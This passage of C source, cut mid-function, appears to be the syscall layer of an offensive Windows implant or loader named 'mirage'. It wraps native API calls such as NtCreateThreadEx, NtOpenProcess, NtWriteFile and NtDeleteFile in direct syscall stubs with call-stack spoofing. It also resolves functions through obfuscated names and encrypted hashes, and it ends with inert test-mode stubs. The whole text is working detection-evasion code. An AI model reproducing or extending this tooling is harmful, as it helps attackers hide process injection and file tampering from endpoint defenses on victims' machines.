                (uint64_t)a, b, (uint64_t)c, d, (uint64_t)e, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtQueryInformationProcess_stub((uint64_t)a,b,(uint64_t)c,d,(uint64_t)e);
    }
    static pNtQueryInformationProcess fn = NULL;
    if (!fn) fn = (pNtQueryInformationProcess)resolve_export_obf(_NtQueryInformationProcess_obf, sizeof(_NtQueryInformationProcess_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtDelayExecution(BOOLEAN a, LARGE_INTEGER* b) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtDelayExecution_stub,
                a, (uint64_t)b, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtDelayExecution_stub(a,(uint64_t)b);
    }
    static pNtDelayExecution fn = NULL;
    if (!fn) fn = (pNtDelayExecution)resolve_export_obf(_NtDelayExecution_obf, sizeof(_NtDelayExecution_obf));
    return fn ? fn(a,b) : -1;
}

NTSTATUS mirage_NtCreateFile(HANDLE* a, ULONG b, PVOID c, PVOID d, PVOID e, ULONG f, ULONG g, ULONG h, ULONG i, PVOID j, ULONG k) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtCreateFile_stub,
                (uint64_t)a, b, (uint64_t)c, (uint64_t)d, (uint64_t)e, f, g, h, i, (uint64_t)j, k);
        }
        return (NTSTATUS)NtCreateFile_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,(uint64_t)e,f,g,h,i,(uint64_t)j,k);
    }
    static pNtCreateFile fn = NULL;
    if (!fn) fn = (pNtCreateFile)resolve_export_obf(_NtCreateFile_obf, sizeof(_NtCreateFile_obf));
    return fn ? fn(a,b,c,d,e,f,g,h,i,j,k) : -1;
}

NTSTATUS mirage_NtOpenFile(HANDLE* a, ULONG b, PVOID c, PVOID d, ULONG e, ULONG f) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtOpenFile_stub,
                (uint64_t)a, b, (uint64_t)c, (uint64_t)d, e, f, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtOpenFile_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,e,f);
    }
    static pNtOpenFile fn = NULL;
    if (!fn) fn = (pNtOpenFile)resolve_export_obf(_NtOpenFile_obf, sizeof(_NtOpenFile_obf));
    return fn ? fn(a,b,c,d,e,f) : -1;
}

NTSTATUS mirage_NtWriteFile(HANDLE a, HANDLE b, PVOID c, PVOID d, PVOID e, PVOID f, ULONG g, PVOID h, PVOID i) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtWriteFile_stub,
                (uint64_t)a, (uint64_t)b, (uint64_t)c, (uint64_t)d, (uint64_t)e, (uint64_t)f, g, (uint64_t)h, (uint64_t)i, 0, 0);
        }
        return (NTSTATUS)NtWriteFile_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,(uint64_t)d,(uint64_t)e,(uint64_t)f,g,(uint64_t)h,(uint64_t)i);
    }
    static pNtWriteFile fn = NULL;
    if (!fn) fn = (pNtWriteFile)resolve_export_obf(_NtWriteFile_obf, sizeof(_NtWriteFile_obf));
    return fn ? fn(a,b,c,d,e,f,g,h,i) : -1;
}

NTSTATUS mirage_NtSetInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtSetInformationProcess_stub,
                (uint64_t)a, b, (uint64_t)c, d, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtSetInformationProcess_stub((uint64_t)a,b,(uint64_t)c,d);
    }
    static pNtSetInformationProcess fn = NULL;
    if (!fn) fn = (pNtSetInformationProcess)resolve_export_obf(_NtSetInformationProcess_obf, sizeof(_NtSetInformationProcess_obf));
    return fn ? fn(a,b,c,d) : -1;
}

NTSTATUS mirage_NtOpenKey(HANDLE* a, ULONG b, PVOID c) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtOpenKey_stub,
                (uint64_t)a, b, (uint64_t)c, 0, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtOpenKey_stub((uint64_t)a,b,(uint64_t)c);
    }
    static pNtOpenKey fn = NULL;
    if (!fn) fn = (pNtOpenKey)resolve_export_obf(_NtOpenKey_obf, sizeof(_NtOpenKey_obf));
    return fn ? fn(a,b,c) : -1;
}

NTSTATUS mirage_NtQueryValueKey(HANDLE a, PVOID b, ULONG c, PVOID d, ULONG e, ULONG* f) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtQueryValueKey_stub,
                (uint64_t)a, (uint64_t)b, c, (uint64_t)d, e, (uint64_t)f, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtQueryValueKey_stub((uint64_t)a,(uint64_t)b,c,(uint64_t)d,e,(uint64_t)f);
    }
    static pNtQueryValueKey fn = NULL;
    if (!fn) fn = (pNtQueryValueKey)resolve_export_obf(_NtQueryValueKey_obf, sizeof(_NtQueryValueKey_obf));
    return fn ? fn(a,b,c,d,e,f) : -1;
}

NTSTATUS mirage_NtOpenProcess(HANDLE* a, ULONG b, PVOID c, PVOID d) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtOpenProcess_stub,
                (uint64_t)a, b, (uint64_t)c, (uint64_t)d, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtOpenProcess_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d);
    }
    static pNtOpenProcess fn = NULL;
    if (!fn) fn = (pNtOpenProcess)resolve_export_obf(_NtOpenProcess_obf, sizeof(_NtOpenProcess_obf));
    return fn ? fn(a,b,c,d) : -1;
}

NTSTATUS mirage_NtCreateThreadEx(HANDLE* a, ULONG b, PVOID c, HANDLE d, PVOID e, PVOID f, ULONG g, SIZE_T h, SIZE_T i, SIZE_T j, PVOID k) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtCreateThreadEx_stub,
                (uint64_t)a, b, (uint64_t)c, (uint64_t)d, (uint64_t)e, (uint64_t)f, g, h, i, j, (uint64_t)k);
        }
        return (NTSTATUS)NtCreateThreadEx_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,(uint64_t)e,(uint64_t)f,g,h,i,j,(uint64_t)k);
    }
    static pNtCreateThreadEx fn = NULL;
    if (!fn) fn = (pNtCreateThreadEx)resolve_export_obf(_NtCreateThreadEx_obf, sizeof(_NtCreateThreadEx_obf));
    return fn ? fn(a,b,c,d,e,f,g,h,i,j,k) : -1;
}

NTSTATUS mirage_NtFlushInstructionCache(HANDLE a, PVOID b, SIZE_T c) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtFlushInstructionCache_stub,
                (uint64_t)a, (uint64_t)b, c, 0, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtFlushInstructionCache_stub((uint64_t)a,(uint64_t)b,c);
    }
    static pNtFlushInstructionCache fn = NULL;
    if (!fn) fn = (pNtFlushInstructionCache)resolve_export_obf(_NtFlushInstructionCache_obf, sizeof(_NtFlushInstructionCache_obf));
    return fn ? fn(a,b,c) : -1;
}

NTSTATUS mirage_NtCreateEvent(HANDLE* a, ULONG b, PVOID c, ULONG d, ULONG e) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtCreateEvent_stub,
                (uint64_t)a, b, (uint64_t)c, d, e, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtCreateEvent_stub((uint64_t)a,b,(uint64_t)c,d,e);
    }
    static pNtCreateEvent fn = NULL;
    if (!fn) fn = (pNtCreateEvent)resolve_export_obf(_NtCreateEvent_obf, sizeof(_NtCreateEvent_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtDeleteFile(PVOID a) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtDeleteFile_stub,
                (uint64_t)a, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtDeleteFile_stub((uint64_t)a);
    }
    static pNtDeleteFile fn = NULL;
    if (!fn) fn = (pNtDeleteFile)resolve_export_obf(_NtDeleteFile_obf, sizeof(_NtDeleteFile_obf));
    return fn ? fn(a) : -1;
}

NTSTATUS mirage_NtSetInformationFile(HANDLE a, PVOID b, PVOID c, ULONG d, ULONG e) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtSetInformationFile_stub,
                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, e, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtSetInformationFile_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,e);
    }
    static pNtSetInformationFile fn = NULL;
    if (!fn) fn = (pNtSetInformationFile)resolve_export_obf(_NtSetInformationFile_obf, sizeof(_NtSetInformationFile_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

LONG mirage_NtUserGetSystemMetrics(ULONG nIndex) {
    /* Unconditional user32 GetSystemMetrics fallback — NtUserGetSystemMetrics
     * is a win32u.dll syscall, unresolvable from ntdll, so the stub and its
     * SSN slot were removed. */
    typedef int (WINAPI *pGetSystemMetrics)(int);
    static pGetSystemMetrics pGSM = NULL;
    if (!pGSM) {
        char dll[32];
        deobf_str(enc_user32, ENC_USER32_LEN, dll);
        void *u32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
        if (u32) {
            char fn[32];
            deobf_str(enc_GetSystemMetrics, ENC_GETSYSTEMMETRICS_LEN, fn);
            pGSM = (pGetSystemMetrics)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
        }
    }
    return pGSM ? (LONG)(uint32_t)pGSM(nIndex) : 0;
}
#else /* ZIALFI_TEST_MODE: wrappers not under test here */
/* The public wrappers exist for link completeness; the resolution tests
 * never call them, so they degenerate to the fallback path (NULL export
 * → -1), which requires no asm or PEB access. */
NTSTATUS mirage_NtAllocateVirtualMemory(HANDLE a, PVOID* b, ULONG c, SIZE_T* d, ULONG e, ULONG f) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f; return -1; }
NTSTATUS mirage_NtProtectVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d, ULONG* e) { (void)a;(void)b;(void)c;(void)d;(void)e; return -1; }
NTSTATUS mirage_NtFreeVirtualMemory(HANDLE a, PVOID* b, SIZE_T* c, ULONG d) { (void)a;(void)b;(void)c;(void)d; return -1; }
NTSTATUS mirage_NtWriteVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T* e) { (void)a;(void)b;(void)c;(void)d;(void)e; return -1; }
NTSTATUS mirage_NtReadVirtualMemory(HANDLE a, PVOID b, PVOID c, SIZE_T d, SIZE_T* e) { (void)a;(void)b;(void)c;(void)d;(void)e; return -1; }
NTSTATUS mirage_NtClose(HANDLE a) { (void)a; return -1; }
NTSTATUS mirage_NtQuerySystemInformation(ULONG a, PVOID b, ULONG c, ULONG* d) { (void)a;(void)b;(void)c;(void)d; return -1; }
NTSTATUS mirage_NtQueryInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d, ULONG* e) { (void)a;(void)b;(void)c;(void)d;(void)e; return -1; }
NTSTATUS mirage_NtDelayExecution(BOOLEAN a, LARGE_INTEGER* b) { (void)a;(void)b; return -1; }
NTSTATUS mirage_NtCreateFile(HANDLE* a, ULONG b, PVOID c, PVOID d, PVOID e, ULONG f, ULONG g, ULONG h, ULONG i, PVOID j, ULONG k) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i;(void)j;(void)k; return -1; }
NTSTATUS mirage_NtOpenFile(HANDLE* a, ULONG b, PVOID c, PVOID d, ULONG e, ULONG f) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f; return -1; }
NTSTATUS mirage_NtWriteFile(HANDLE a, HANDLE b, PVOID c, PVOID d, PVOID e, PVOID f, ULONG g, PVOID h, PVOID i) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i; return -1; }
NTSTATUS mirage_NtSetInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d) { (void)a;(void)b;(void)c;(void)d; return -1; }
NTSTATUS mirage_NtOpenKey(HANDLE* a, ULONG b, PVOID c) { (void)a;(void)b;(void)c; return -1; }
NTSTATUS mirage_NtQueryValueKey(HANDLE a, PVOID b, ULONG c, PVOID d, ULONG e, ULONG* f) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f; return -1; }
NTSTATUS mirage_NtOpenProcess(HANDLE* a, ULONG b, PVOID c, PVOID d) { (void)a;(void)b;(void)c;(void)d; return -1; }
NTSTATUS mirage_NtCreateThreadEx(HANDLE* a, ULONG b, PVOID c, HANDLE d, PVOID e, PVOID f, ULONG g, SIZE_T h, SIZE_T i, SIZE_T j, PVOID k) { (void)a;(void)b;(void)c;(void)d;(void)e;(void)f;(void)g;(void)h;(void)i;(void)j;(void)k; return -1; }
NTSTATUS mirage_NtFlushInstructionCache(HANDLE a, PVOID b, SIZE_T c) { (void)a;(void)b;(void)c; return -1; }
NTSTATUS mirage_NtCreateEvent(HANDLE* a, ULONG b, PVOID c, ULONG d, ULONG e) { (void)a;(void)b;(void)c;(void)d;(void)e; return -1; }
NTSTATUS mirage_NtDeleteFile(PVOID a) { (void)a; return -1; }
NTSTATUS mirage_NtSetInformationFile(HANDLE a, PVOID b, PVOID c, ULONG d, ULONG e) { (void)a;(void)b;(void)c;(void)d;(void)e; return -1; }
LONG mirage_NtUserGetSystemMetrics(ULONG nIndex) { (void)nIndex; return 0; }
#endif
